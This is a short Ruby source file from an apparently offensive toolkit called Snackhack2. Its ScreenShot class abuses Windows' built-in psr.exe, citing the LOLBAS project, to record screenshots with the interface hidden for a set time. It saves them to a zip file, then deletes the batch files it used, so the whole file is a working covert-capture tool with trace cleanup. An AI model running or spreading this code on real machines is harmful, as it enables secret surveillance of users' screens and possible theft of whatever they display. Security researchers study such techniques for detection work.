# frozen_string_literal: true

require 'shellwords'
module Snackhack2
  class ScreenShot
    attr_accessor :zip, :time

    # https://lolbas-project.github.io/lolbas/Binaries/Psr/
    def initialize
      @zip = 'screenshots.zip'
      @time = 60
    end

    def run
      # creates a `.bat` filw with a command that will start the screen recordings
      File.open('lol.bat', 'w+') { |file| file.write("psr.exe /start /output #{@zip} /sc 1 /gui 0") }
      # this will save a .bat file that will stop the recording
      File.open('lol2.bat', 'w+') { |file| file.write('psr.exe /stop') }
      # run `lol.bat`
      Process.spawn('lol.bat')
      # sleeps for the amount of time declared in instance variable `@time` which by 
      # defualt is 60 seconds 
      sleep @time.to_i
      # runs lol2.bat
      system('lol2.bat')
      sleep 2
      # deletes both `lol.bat` and `lol2.bat`.
      File.delete('lol.bat')
      File.delete('lol2.bat')
    end
  end
end
